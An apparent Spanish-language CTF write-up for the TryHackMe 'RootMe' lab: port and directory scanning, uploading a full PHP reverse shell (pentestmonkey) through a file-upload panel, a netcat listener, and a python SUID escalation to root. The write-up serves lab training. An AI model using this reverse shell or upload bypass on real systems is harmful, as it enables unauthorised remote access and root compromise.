<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>RootMe | B3nder0n</title><meta name=keywords content><meta name=description content="En este writeup trabajaremos sobre la máquina RootMe, es una maquina facil y acontinuación veremos como resolverla.
IPs Maáuina atacante => 10.8.46.8
Máquina victima => 10.10.84.238
RECONOCIMIENTO El primer paso es ver si tenemos conexión con la máquina, así que haremos un ping a la máquina victima.
➜ ping -c 1 10.10.84.238 PING 10.10.216.249 (10.10.216.249) 56(84) bytes of data. 64 bytes from 10.10.216.249: icmp_seq=1 ttl=63 time=79.7 ms --- 10.10.84.238 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 79."><meta name=author content="B3nder0n & D3b0o"><link rel=canonical href=https://b3nder0n.github.io/writeups/rootme/><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.374172b1ab85222d96052aa197a9bed028ba955a8b01a8d6e5ae5e1cfa8f7c5a.css integrity="sha256-N0FysauFIi2WBSqhl6m+0Ci6lVqLAajW5a5eHPqPfFo=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://b3nder0n.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://b3nder0n.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=https://b3nder0n.github.io/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=https://b3nder0n.github.io/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=https://b3nder0n.github.io/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script async src="https://www.googletagmanager.com/gtag/js?id=G-NJQET6FQLX"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-NJQET6FQLX",{anonymize_ip:!1})}</script><meta property="og:title" content="RootMe"><meta property="og:description" content="En este writeup trabajaremos sobre la máquina RootMe, es una maquina facil y acontinuación veremos como resolverla.
IPs Maáuina atacante => 10.8.46.8
Máquina victima => 10.10.84.238
RECONOCIMIENTO El primer paso es ver si tenemos conexión con la máquina, así que haremos un ping a la máquina victima.
➜ ping -c 1 10.10.84.238 PING 10.10.216.249 (10.10.216.249) 56(84) bytes of data. 64 bytes from 10.10.216.249: icmp_seq=1 ttl=63 time=79.7 ms --- 10.10.84.238 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 79."><meta property="og:type" content="article"><meta property="og:url" content="https://b3nder0n.github.io/writeups/rootme/"><meta property="og:image" content="https://b3nder0n.github.io/images/rootmee.png"><meta property="article:section" content="writeups"><meta property="og:site_name" content="B3nder0n"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://b3nder0n.github.io/images/rootmee.png"><meta name=twitter:title content="RootMe"><meta name=twitter:description content="En este writeup trabajaremos sobre la máquina RootMe, es una maquina facil y acontinuación veremos como resolverla.
IPs Maáuina atacante => 10.8.46.8
Máquina victima => 10.10.84.238
RECONOCIMIENTO El primer paso es ver si tenemos conexión con la máquina, así que haremos un ping a la máquina victima.
➜ ping -c 1 10.10.84.238 PING 10.10.216.249 (10.10.216.249) 56(84) bytes of data. 64 bytes from 10.10.216.249: icmp_seq=1 ttl=63 time=79.7 ms --- 10.10.84.238 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 79."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"","item":"https://b3nder0n.github.io/writeups/"},{"@type":"ListItem","position":2,"name":"RootMe","item":"https://b3nder0n.github.io/writeups/rootme/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"RootMe","name":"RootMe","description":"En este writeup trabajaremos sobre la máquina RootMe, es una maquina facil y acontinuación veremos como resolverla.\nIPs Maáuina atacante =\u0026gt; 10.8.46.8\nMáquina victima =\u0026gt; 10.10.84.238\nRECONOCIMIENTO El primer paso es ver si tenemos conexión con la máquina, así que haremos un ping a la máquina victima.\n➜ ping -c 1 10.10.84.238 PING 10.10.216.249 (10.10.216.249) 56(84) bytes of data. 64 bytes from 10.10.216.249: icmp_seq=1 ttl=63 time=79.7 ms --- 10.10.84.238 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 79.","keywords":[],"articleBody":"En este writeup trabajaremos sobre la máquina RootMe, es una maquina facil y acontinuación veremos como resolverla.\nIPs Maáuina atacante =\u003e 10.8.46.8\nMáquina victima =\u003e 10.10.84.238\nRECONOCIMIENTO El primer paso es ver si tenemos conexión con la máquina, así que haremos un ping a la máquina victima.\n➜ ping -c 1 10.10.84.238 PING 10.10.216.249 (10.10.216.249) 56(84) bytes of data. 64 bytes from 10.10.216.249: icmp_seq=1 ttl=63 time=79.7 ms --- 10.10.84.238 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 79.676/79.676/79.676/0.000 ms Al decirnos que un paquete ha sido transmitido y uno recibido sabemos que tenemos conexion con la máquina. Además sabiendo que el ttl = 63 sabemos que es una máquina linux.\nESCANEO Para escanear la máquina con el fin de ver que puertos estan abiertos usaremos la herramienta nmap.\n➜ sudo nmap -p- --open -sS --min-rate 5000 -n -vvv -Pn 10.10.84.238 PORT STATE SERVICE REASON 22/tcp open ssh syn-ack ttl 63 80/tcp open http syn-ack ttl 63 Ya tenemos informacion importante, sabemos que el puerto 80 esta abierto y que este corre un servicio http. Y sabemos que el puerto 22 está abierto y que este corre un servicio ssh.\nVeamos un poco mas de información de estos puertos para poder ejecutar scripts de reconocimiento. Para ello volveremos a usar nmap.\n➜ sudo nmap -p22,80 -sC -sV 10.10.84.238 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 4ab9160884c25448ba5cfd3f225f2214 (RSA) | 256 a9a686e8ec96c3f003cd16d54973d082 (ECDSA) |_ 256 22f6b5a654d9787c26035a95f3f9dfcd (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-title: HackIT - Home | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: Apache/2.4.29 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel HACKEANDO Vamos a empezar el proceso mas divertido, vulnerar la máquina para ello seguiremos una serie de pasos que a continuación están explicados.\nOBSERVANDO Vamos a ver como se ve la WEB que se está ejecutando en el puerto 80. Para ello ponemos la IP de la máquina en el buscador de google.\nAl entrar solo vemos esto:\nSUBDIRECTORIOS Como no vemos nada más en la página web vamos a aplicar una búsqueda de subdirectorios con wfuzz.\n➜ wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.84.238/FUZZ ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000552: 301 9 L 28 W 310 Ch \"css\" 000000955: 301 9 L 28 W 309 Ch \"js\" 000005522: 301 9 L 28 W 312 Ch \"panel\" 000000166: 301 9 L 28 W 314 Ch \"uploads\" Podemos ver que hay un subdirectorio llamado panel, vamos a mirar que hay dentro.\nPonemos en la URL /panel, quedaria así : http://10.10.84.238/panel/.\nPodemos ver que en este sitio se pueden subir archivos, vamos a intentar subir una reverse shell en PHP. Para ello crearemos un archivo llamado php-reverse-shell.phtmlque contendrá lo siguiente:\n\u003c?php // php-reverse-shell - A Reverse Shell implementation in PHP // Copyright (C) 2007 pentestmonkey@pentestmonkey.net // // This tool may be used for legal purposes only. Users take full responsibility // for any actions performed using this tool. The author accepts no liability // for damage caused by this tool. If these terms are not acceptable to you, then // do not use this tool. // // In all other respects the GPL version 2 applies: // // This program is free software; you can redistribute it and/or modify // it under the terms of the GNU General Public License version 2 as // published by the Free Software Foundation. // // This program is distributed in the hope that it will be useful, // but WITHOUT ANY WARRANTY; without even the implied warranty of // MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the // GNU General Public License for more details. // // You should have received a copy of the GNU General Public License along // with this program; if not, write to the Free Software Foundation, Inc., // 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA. // // This tool may be used for legal purposes only. Users take full responsibility // for any actions performed using this tool. If these terms are not acceptable to // you, then do not use this tool. // // You are encouraged to send comments, improvements or suggestions to // me at pentestmonkey@pentestmonkey.net // // Description // ----------- // This script will make an outbound TCP connection to a hardcoded IP and port. // The recipient will be given a shell running as the current user (apache normally). // // Limitations // ----------- // proc_open and stream_set_blocking require PHP version 4.3+, or 5+ // Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Wi\u003e // Some compile-time options are needed for daemonisation (like pcntl, posix). These are rarely availabl\u003e // // Usage // ----- // See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck. set_time_limit (0); $VERSION = \"1.0\"; $ip = 'Nuestra_IP'; // CHANGE THIS $port = 'puerto '; // CHANGE THIS $chunk_size = 1400; $write_a = null; $error_a = null; $shell = 'uname -a; w; id; /bin/sh -i'; $daemon = 0; $debug = 0; // // Daemonise ourself if possible to avoid zombies later // // pcntl_fork is hardly ever available, but will allow us to daemonise // our php process and avoid zombies. Worth a try... if (function_exists('pcntl_fork')) { // Fork and have the parent process exit $pid = pcntl_fork(); if ($pid == -1) { printit(\"ERROR: Can't fork\"); exit(1); } if ($pid) { exit(0); // Parent exits } // Make the current process a session leader // Will only succeed if we forked if (posix_setsid() == -1) { printit(\"Error: Can't setsid()\"); exit(1); } $daemon = 1; } else { printit(\"WARNING: Failed to daemonise. This is quite common and not fatal.\"); } // Change to a safe directory chdir(\"/\"); // Remove any umask we inherited umask(0); // // Do the reverse shell... // // Open reverse connection $sock = fsockopen($ip, $port, $errno, $errstr, 30); if (!$sock) { printit(\"$errstr ($errno)\"); exit(1); } // Spawn shell process $descriptorspec = array( 0 =\u003e array(\"pipe\", \"r\"), // stdin is a pipe that the child will read from 1 =\u003e array(\"pipe\", \"w\"), // stdout is a pipe that the child will write to 2 =\u003e array(\"pipe\", \"w\") // stderr is a pipe that the child will write to ); $process = proc_open($shell, $descriptorspec, $pipes); if (!is_resource($process)) { printit(\"ERROR: Can't spawn shell\"); exit(1); } // Set everything to non-blocking // Reason: Occsionally reads will block, even though stream_select tells us they won't stream_set_blocking($pipes[0], 0); stream_set_blocking($pipes[1], 0); stream_set_blocking($pipes[2], 0); stream_set_blocking($sock, 0); printit(\"Successfully opened reverse shell to $ip:$port\"); while (1) { // Check for end of TCP connection if (feof($sock)) { printit(\"ERROR: Shell connection terminated\"); break; } // Check for end of STDOUT if (feof($pipes[1])) { printit(\"ERROR: Shell process terminated\"); break; } // Wait until a command is end down $sock, or some // command output is available on STDOUT or STDERR $read_a = array($sock, $pipes[1], $pipes[2]); $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null); // If we can read from the TCP socket, send // data to process's STDIN if (in_array($sock, $read_a)) { if ($debug) printit(\"SOCK READ\"); $input = fread($sock, $chunk_size); if ($debug) printit(\"SOCK: $input\"); fwrite($pipes[0], $input); } // If we can read from the process's STDOUT // send data down tcp connection if (in_array($pipes[1], $read_a)) { if ($debug) printit(\"STDOUT READ\"); $input = fread($pipes[2], $chunk_size); if ($debug) printit(\"STDERR: $input\"); fwrite($sock, $input); } } fclose($sock); fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($process); // Like print, but does nothing if we've daemonised ourself // (I can't figure out how to redirect STDOUT like a proper daemon) function printit ($string) { if (!$daemon) { print \"$string\\n\"; } } ?\u003e Ya estaría niestro archivo, quedaria cambiar el parametro del puerto y de la IP a los niestros, yo por ejemplo tengo que poneri de IP la 10.10.46.8 y de puerto el 443.\nVamos a ponernos por escucha en el puerto 443 desde nuetra terminal:\n➜ nc -nlvp 443 Y ahora subiremos el archivo a la página web.\nVemos que se ha subido correctamente, pero si nos fijamos en nuestra terminal todavia no sale nada:\nnc -nlvp 443 listening on [any] 443 ... Eso es porque el archivo se ha subido pero no se ha ejecutado, si nos acordamos el wfuzz nos ha dado previamente un directorio /uploads.\n000000166: 301 9 L 28 W 314 Ch \"uploads\" Si nos movemos a la URL http://10.10.84.238/uploads veremos lo siguiente:\nVamos a hacer clic en nuestro archivo. Aparentemente no ha sucedido nada pero vamos a fijarnos en nuestra terminal:\nLinux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux 14:33:41 up 1:05, 0 users, load average: 0.00, 0.00, 0.56 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=33(www-data) gid=33(www-data) groups=33(www-data) /bin/sh: 0: can't access tty; job control turned off $ EUREKA!!! Estamos conectados a la máquina, pero todavia no hemos acabado.\nVamos a realizar un tratamiento de la tty para poder operar mas comodamente.\nscript /dev/null -c bash ctrl + z\nstty raw -echo; fg reset xterm export SHELL=bash export TERM=xterm Ahora tendriamos que ver algo así:\nwww-data@rootme:/$ Para encontrar la bandera de usuario vamos a ponernos en el directorio /var/www.\nwww-data@rootme:/$ cd /var/www www-data@rootme:/var/www$ cat user.txt ******************** www-data@rootme:/var/www$ Despés de buscar durante bastante, me di cuenta que en historial hay un comando un tanto extraño, lo podemos ver usando el comando history.\npython -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")' Vamos a probar de poner este comando.\nwww-data@rootme:/var/www$ python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")' # whoami root # YA ESTAA!!! Si hacemos el comando whoami podremos ver que somos root. Ahora solo queda encontrar la bandera de root que en este caso está en /root.\n# cat /root/root.txt ************************* # Y esto seria la resolución de la máquina RootMe, espero que os sirva de soporte por si os quedais estancados.\n","wordCount":"1629","inLanguage":"en","image":"https://b3nder0n.github.io/images/rootmee.png","datePublished":"0001-01-01T00:00:00Z","dateModified":"0001-01-01T00:00:00Z","author":{"@type":"Person","name":"B3nder0n \u0026 D3b0o"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://b3nder0n.github.io/writeups/rootme/"},"publisher":{"@type":"Organization","name":"B3nder0n","logo":{"@type":"ImageObject","url":"https://b3nder0n.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://b3nder0n.github.io/ accesskey=h title="Home (Alt + H)"><img src=https://b3nder0n.github.io/apple-touch-icon.png alt aria-label=logo height=35>Home</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://b3nder0n.github.io/whoami title=Whoami><span>Whoami</span></a></li><li><a href=https://b3nder0n.github.io/search title=Buscar><span>Buscar</span></a></li><li><a href=https://b3nder0n.github.io/tags title=Tags><span>Tags</span></a></li><li><a href=https://b3nder0n.github.io/categories title=Categorias><span>Categorias</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://b3nder0n.github.io/>Inicio</a>&nbsp;»&nbsp;<a href=https://b3nder0n.github.io/writeups/></a></div><h1 class=post-title>RootMe</h1><div class=post-meta>8 min&nbsp;·&nbsp;B3nder0n & D3b0o&nbsp;|&nbsp;<a href=https://github.com/%3cpath_to_repo%3e/content/writeups/RootMe/index.md rel="noopener noreferrer" target=_blank>Suggest Changes</a></div></header><figure class=entry-cover><img loading=lazy src=https://b3nder0n.github.io/images/rootmee.png alt><p></p></figure><aside id=toc-container class="toc-container wide"><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Tabla de Contenidos</span></summary><div class=inner><ul><li><a href=#ips aria-label=IPs><strong>IPs</strong></a></li><li><a href=#reconocimiento aria-label=RECONOCIMIENTO><strong>RECONOCIMIENTO</strong></a></li><li><a href=#escaneo aria-label=ESCANEO><strong>ESCANEO</strong></a></li><li><a href=#hackeando aria-label=HACKEANDO><strong>HACKEANDO</strong></a><ul><li><a href=#observando aria-label=OBSERVANDO><strong>OBSERVANDO</strong></a></li><li><a href=#subdirectorios aria-label=SUBDIRECTORIOS><strong>SUBDIRECTORIOS</strong></a></li></ul></li></ul></div></details></div></aside><script>let activeElement,elements;window.addEventListener("DOMContentLoaded",function(){checkTocPosition(),elements=document.querySelectorAll("h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]"),activeElement=elements[0];const t=encodeURI(activeElement.getAttribute("id")).toLowerCase();document.querySelector(`.inner ul li a[href="#${t}"]`).classList.add("active")},!1),window.addEventListener("resize",function(){checkTocPosition()},!1),window.addEventListener("scroll",()=>{activeElement=Array.from(elements).find(e=>{if(getOffsetTop(e)-window.pageYOffset>0&&getOffsetTop(e)-window.pageYOffset<window.innerHeight/2)return e})||activeElement,elements.forEach(e=>{const t=encodeURI(e.getAttribute("id")).toLowerCase();e===activeElement?document.querySelector(`.inner ul li a[href="#${t}"]`).classList.add("active"):document.querySelector(`.inner ul li a[href="#${t}"]`).classList.remove("active")})},!1);const main=parseInt(getComputedStyle(document.body).getPropertyValue("--article-width"),10),toc=parseInt(getComputedStyle(document.body).getPropertyValue("--toc-width"),10),gap=parseInt(getComputedStyle(document.body).getPropertyValue("--gap"),10);function checkTocPosition(){const e=document.body.scrollWidth;e-main-toc*2-gap*4>0?document.getElementById("toc-container").classList.add("wide"):document.getElementById("toc-container").classList.remove("wide")}function getOffsetTop(e){if(!e.getClientRects().length)return 0;let t=e.getBoundingClientRect(),n=e.ownerDocument.defaultView;return t.top+n.pageYOffset}</script><div class=post-content><p>En este writeup trabajaremos sobre la máquina <a href=https://tryhackme.com/room/rrootme>RootMe</a>, es una maquina facil y acontinuación veremos como resolverla.</p><h2 id=ips><strong>IPs</strong><a hidden class=anchor aria-hidden=true href=#ips>#</a></h2><p>Maáuina atacante => 10.8.46.8</p><p>Máquina victima => 10.10.84.238</p><h2 id=reconocimiento><strong>RECONOCIMIENTO</strong><a hidden class=anchor aria-hidden=true href=#reconocimiento>#</a></h2><p>El primer paso es ver si tenemos conexión con la máquina, así que haremos un <code>ping</code> a la máquina victima.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>➜ ping -c 1 10.10.84.238
</span></span><span class=line><span class=cl>PING 10.10.216.249 (10.10.216.249) 56(84) bytes of data.
</span></span><span class=line><span class=cl>64 bytes from 10.10.216.249: icmp_seq=1 ttl=63 time=79.7 ms
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>--- 10.10.84.238 ping statistics ---
</span></span><span class=line><span class=cl>1 packets transmitted, 1 received, 0% packet loss, time 0ms
</span></span><span class=line><span class=cl>rtt min/avg/max/mdev = 79.676/79.676/79.676/0.000 ms
</span></span></code></pre></div><p>Al decirnos que un paquete ha sido transmitido y uno recibido sabemos que tenemos conexion con la máquina. Además sabiendo que el ttl = 63 sabemos que es una máquina linux.</p><h2 id=escaneo><strong>ESCANEO</strong><a hidden class=anchor aria-hidden=true href=#escaneo>#</a></h2><p>Para escanear la máquina con el fin de ver que puertos estan abiertos usaremos la herramienta <code>nmap</code>.</p><pre tabindex=0><code class=language-nmap data-lang=nmap>➜ sudo nmap -p- --open -sS --min-rate 5000 -n -vvv -Pn 10.10.84.238

PORT      STATE    SERVICE REASON
22/tcp    open     ssh     syn-ack ttl 63
80/tcp    open     http    syn-ack ttl 63
</code></pre><p>Ya tenemos informacion importante, sabemos que el puerto 80 esta abierto y que este corre un servicio http. Y sabemos que el puerto 22 está abierto y que este corre un servicio ssh.</p><p>Veamos un poco mas de información de estos puertos para poder ejecutar scripts de reconocimiento. Para ello volveremos a usar <code>nmap</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>➜ sudo nmap -p22,80 -sC -sV 10.10.84.238
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PORT   STATE SERVICE VERSION
</span></span><span class=line><span class=cl>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
</span></span><span class=line><span class=cl>| ssh-hostkey: 
</span></span><span class=line><span class=cl>|   2048 4ab9160884c25448ba5cfd3f225f2214 (RSA)
</span></span><span class=line><span class=cl>|   256 a9a686e8ec96c3f003cd16d54973d082 (ECDSA)
</span></span><span class=line><span class=cl>|_  256 22f6b5a654d9787c26035a95f3f9dfcd (ED25519)
</span></span><span class=line><span class=cl>80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
</span></span><span class=line><span class=cl>|_http-title: HackIT - Home
</span></span><span class=line><span class=cl>| http-cookie-flags: 
</span></span><span class=line><span class=cl>|   /: 
</span></span><span class=line><span class=cl>|     PHPSESSID: 
</span></span><span class=line><span class=cl>|_      httponly flag not set
</span></span><span class=line><span class=cl>|_http-server-header: Apache/2.4.29 (Ubuntu)
</span></span><span class=line><span class=cl>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span></code></pre></div><h2 id=hackeando><strong>HACKEANDO</strong><a hidden class=anchor aria-hidden=true href=#hackeando>#</a></h2><p>Vamos a empezar el proceso mas divertido, vulnerar la máquina para ello seguiremos una serie de pasos que a continuación están explicados.</p><h3 id=observando><strong>OBSERVANDO</strong><a hidden class=anchor aria-hidden=true href=#observando>#</a></h3><p>Vamos a ver como se ve la WEB que se está ejecutando en el puerto 80. Para ello ponemos la IP de la máquina en el buscador de google.</p><p>Al entrar solo vemos esto:</p><p><img loading=lazy src=Images/rootme.png alt></p><h3 id=subdirectorios><strong>SUBDIRECTORIOS</strong><a hidden class=anchor aria-hidden=true href=#subdirectorios>#</a></h3><p>Como no vemos nada más en la página web vamos a aplicar una búsqueda de subdirectorios con <code>wfuzz</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>➜  wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.84.238/FUZZ
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>=====================================================================
</span></span><span class=line><span class=cl>ID           Response   Lines    Word       Chars       Payload                                  
</span></span><span class=line><span class=cl>=====================================================================
</span></span><span class=line><span class=cl>000000552:   301        9 L      28 W       310 Ch      &#34;css&#34;                                    
</span></span><span class=line><span class=cl>000000955:   301        9 L      28 W       309 Ch      &#34;js&#34;                                     
</span></span><span class=line><span class=cl>000005522:   301        9 L      28 W       312 Ch      &#34;panel&#34;                                  
</span></span><span class=line><span class=cl>000000166:   301        9 L      28 W       314 Ch      &#34;uploads&#34;                                
</span></span></code></pre></div><p>Podemos ver que hay un subdirectorio llamado <code>panel</code>, vamos a mirar que hay dentro.</p><p>Ponemos en la URL <code>/panel</code>, quedaria así : <code>http://10.10.84.238/panel/</code>.</p><p><img loading=lazy src=Images/rootme1.png alt></p><p>Podemos ver que en este sitio se pueden subir archivos, vamos a intentar subir una reverse shell en <code>PHP</code>. Para ello crearemos un archivo llamado <code>php-reverse-shell.phtml</code>que contendrá lo siguiente:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>&lt;?php
</span></span><span class=line><span class=cl>// php-reverse-shell - A Reverse Shell implementation in PHP
</span></span><span class=line><span class=cl>// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
</span></span><span class=line><span class=cl>//
</span></span><span class=line><span class=cl>// This tool may be used for legal purposes only.  Users take full responsibility
</span></span><span class=line><span class=cl>// for any actions performed using this tool.  The author accepts no liability
</span></span><span class=line><span class=cl>// for damage caused by this tool.  If these terms are not acceptable to you, then
</span></span><span class=line><span class=cl>// do not use this tool.
</span></span><span class=line><span class=cl>//
</span></span><span class=line><span class=cl>// In all other respects the GPL version 2 applies:
</span></span><span class=line><span class=cl>//
</span></span><span class=line><span class=cl>// This program is free software; you can redistribute it and/or modify
</span></span><span class=line><span class=cl>// it under the terms of the GNU General Public License version 2 as
</span></span><span class=line><span class=cl>// published by the Free Software Foundation.
</span></span><span class=line><span class=cl>//
</span></span><span class=line><span class=cl>// This program is distributed in the hope that it will be useful,
</span></span><span class=line><span class=cl>// but WITHOUT ANY WARRANTY; without even the implied warranty of
</span></span><span class=line><span class=cl>// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
</span></span><span class=line><span class=cl>// GNU General Public License for more details.
</span></span><span class=line><span class=cl>//
</span></span><span class=line><span class=cl>// You should have received a copy of the GNU General Public License along
</span></span><span class=line><span class=cl>// with this program; if not, write to the Free Software Foundation, Inc.,
</span></span><span class=line><span class=cl>// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
</span></span><span class=line><span class=cl>//
</span></span><span class=line><span class=cl>// This tool may be used for legal purposes only.  Users take full responsibility
</span></span><span class=line><span class=cl>// for any actions performed using this tool.  If these terms are not acceptable to
</span></span><span class=line><span class=cl>// you, then do not use this tool.
</span></span><span class=line><span class=cl>//
</span></span><span class=line><span class=cl>// You are encouraged to send comments, improvements or suggestions to
</span></span><span class=line><span class=cl>// me at pentestmonkey@pentestmonkey.net
</span></span><span class=line><span class=cl>//
</span></span><span class=line><span class=cl>// Description
</span></span><span class=line><span class=cl>// -----------
</span></span><span class=line><span class=cl>// This script will make an outbound TCP connection to a hardcoded IP and port.
</span></span><span class=line><span class=cl>// The recipient will be given a shell running as the current user (apache normally).
</span></span><span class=line><span class=cl>//
</span></span><span class=line><span class=cl>// Limitations
</span></span><span class=line><span class=cl>// -----------
</span></span><span class=line><span class=cl>// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
</span></span><span class=line><span class=cl>// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Wi&gt;
</span></span><span class=line><span class=cl>// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely availabl&gt;
</span></span><span class=line><span class=cl>//
</span></span><span class=line><span class=cl>// Usage
</span></span><span class=line><span class=cl>// -----
</span></span><span class=line><span class=cl>// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>set_time_limit (0);
</span></span><span class=line><span class=cl>$VERSION = &#34;1.0&#34;;
</span></span><span class=line><span class=cl>$ip = &#39;Nuestra_IP&#39;;  // CHANGE THIS
</span></span><span class=line><span class=cl>$port = &#39;puerto &#39;;       // CHANGE THIS
</span></span><span class=line><span class=cl>$chunk_size = 1400;
</span></span><span class=line><span class=cl>$write_a = null;
</span></span><span class=line><span class=cl>$error_a = null;
</span></span><span class=line><span class=cl>$shell = &#39;uname -a; w; id; /bin/sh -i&#39;;
</span></span><span class=line><span class=cl>$daemon = 0;
</span></span><span class=line><span class=cl>$debug = 0;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>//
</span></span><span class=line><span class=cl>// Daemonise ourself if possible to avoid zombies later
</span></span><span class=line><span class=cl>//
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>// pcntl_fork is hardly ever available, but will allow us to daemonise
</span></span><span class=line><span class=cl>// our php process and avoid zombies.  Worth a try...
</span></span><span class=line><span class=cl>if (function_exists(&#39;pcntl_fork&#39;)) {
</span></span><span class=line><span class=cl>        // Fork and have the parent process exit
</span></span><span class=line><span class=cl>        $pid = pcntl_fork();
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        if ($pid == -1) {
</span></span><span class=line><span class=cl>                printit(&#34;ERROR: Can&#39;t fork&#34;);
</span></span><span class=line><span class=cl>                exit(1);
